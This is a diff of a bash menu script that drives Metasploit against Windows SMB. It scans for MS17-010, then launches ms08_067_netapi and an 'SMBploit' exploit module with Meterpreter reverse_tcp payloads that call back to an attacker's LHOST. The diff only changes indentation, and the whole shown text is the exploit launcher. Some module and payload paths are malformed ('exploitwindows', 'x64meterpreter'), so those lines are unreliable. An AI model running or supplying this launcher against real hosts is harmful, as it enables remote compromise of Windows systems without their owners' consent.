@@ -68,9 +68,9 @@ if [ $opc -eq 0 ]; then
 	echo -e "$a Scan IP:$v $rhost $nc"
 	echo ""
 	msfconsole -q -x " use auxiliary/scanner/smb/smb_ms17_010;
-		set RHOSTS $rhost;
-		run;
-		exit; "
+	set RHOSTS $rhost;
+	run;
+	exit; "
 	echo ""
 	sleep 1
 	banner
@@ -86,11 +86,11 @@ elif [ $opc -eq 1 ]; then
 	read rhost
 	echo ""
 	msfconsole -q -x " use exploit/windows/smb/ms08_067_netapi;
-		set PAYLOAD windows/meterpreter/reverse_tcp;
-		set RHOSTS $rhost;
-		set LHOST $lhost;
-		exploit;
-		exit; "
+	set PAYLOAD windows/meterpreter/reverse_tcp;
+	set RHOSTS $rhost;
+	set LHOST $lhost;
+	exploit;
+	exit; "
 	echo ""
 	sleep 5
 	clear
@@ -108,13 +108,13 @@ elif [ $opc -eq 2 ]; then
 	read rhost
 	echo ""
 	msfconsole -q -x " use exploit/windows/smb/SMBploit;
-		set PAYLOAD windows/meterpreter/reverse_tcp;
-		set RHOSTS $rhost;
-		set LHOST $lhost;
-		set target 4;
-		set TARGETARCHITECTURE x86;
-		exploit;
-		exit; "
+	set PAYLOAD windows/meterpreter/reverse_tcp;
+	set RHOSTS $rhost;
+	set LHOST $lhost;
+	set target 4;
+	set TARGETARCHITECTURE x86;
+	exploit;
+	exit; "
 	echo ""
 	sleep 5
 	clear
@@ -132,13 +132,13 @@ elif [ $opc -eq 3 ]; then
 	read rhost
 	echo ""
 	msfconsole -q -x " use exploit/windows/smb/SMBploit;
-		set PAYLOAD windows/x64/meterpreter/reverse_tcp;
-		set RHOSTS $rhost;
-		set LHOST $lhost;
-		set target 5;
-		set TARGETARCHITECTURE x64;
-		exploit;
-		exit; "
+	set PAYLOAD windows/x64/meterpreter/reverse_tcp;
+	set RHOSTS $rhost;
+	set LHOST $lhost;
+	set target 5;
+	set TARGETARCHITECTURE x64;
+	exploit;
+	exit; "
 	echo ""
 	sleep 5
 	clear
@@ -156,13 +156,13 @@ elif [ $opc -eq 4 ]; then
 	read rhost
 	echo ""
 	msfconsole -q -x " use exploit/windows/smb/SMBploit;
-		set PAYLOAD windows/meterpreter/reverse_tcp;
-		set RHOSTS $rhost;
-		set LHOST $lhost;
-		set target 7;
-		set TARGETARCHITECTURE x86;
-		exploit;
-		exit; "
+	set PAYLOAD windows/meterpreter/reverse_tcp;
+	set RHOSTS $rhost;
+	set LHOST $lhost;
+	set target 7;
+	set TARGETARCHITECTURE x86;
+	exploit;
+	exit; "
         echo ""
 	sleep 5
 	clear
@@ -180,13 +180,13 @@ elif [ $opc -eq 5 ]; then
 	read rhost
 	echo ""
 	msfconsole -q -x " use exploitwindows/smb/SMBploit;
-		set PAYLOAD windows/x64/meterpreter/reverse_tcp;
-		set RHOSTS $rhost;
-		set LHOST $lhost;
-		set target 7;
-		set TARGETARCHITECTURE x64;
-		exploit;
-		exit; "
+	set PAYLOAD windows/x64/meterpreter/reverse_tcp;
+	set RHOSTS $rhost;
+	set LHOST $lhost;
+	set target 7;
+	set TARGETARCHITECTURE x64;
+	exploit;
+	exit; "
 	echo ""
 	sleep 5
 	clear
@@ -204,13 +204,13 @@ elif [ $opc -eq 6 ]; then
 	read rhost
 	echo ""
 	msfconsole -q -x " use exploit/windows/smb/SMBploit;
-		set PAYLOAD windows/meterpreter/reverse_tcp;
-		set RHOSTS $rhost;
-		set LHOST $lhost;
-		set target 8;
-		set TARGETARCHITECTURE x86;
-		exploit;
-		exit; "
+	set PAYLOAD windows/meterpreter/reverse_tcp;
+	set RHOSTS $rhost;
+	set LHOST $lhost;
+	set target 8;
+	set TARGETARCHITECTURE x86;
+	exploit;
+	exit; "
 	echo ""
 	sleep 5
 	clear
@@ -228,13 +228,13 @@ elif [ $opc -eq 7 ]; then
 	read rhost
 	echo ""
 	msfconsole -q -x " use exploit/windows/smb/SMBploit;
-		set PAYLOAD windows/x64meterpreter/reverse_tcp;
-		set RHOSTS $rhost;
-		set LHOST $lhost;
-		set target 8;
-		set TARGETARCHITECTURE x64;
-		exploit;
-		exit; "
+	set PAYLOAD windows/x64meterpreter/reverse_tcp;
+	set RHOSTS $rhost;
+	set LHOST $lhost;
+	set target 8;
+	set TARGETARCHITECTURE x64;
+	exploit;
+	exit; "
 	echo ""
 	sleep 5
 	clear
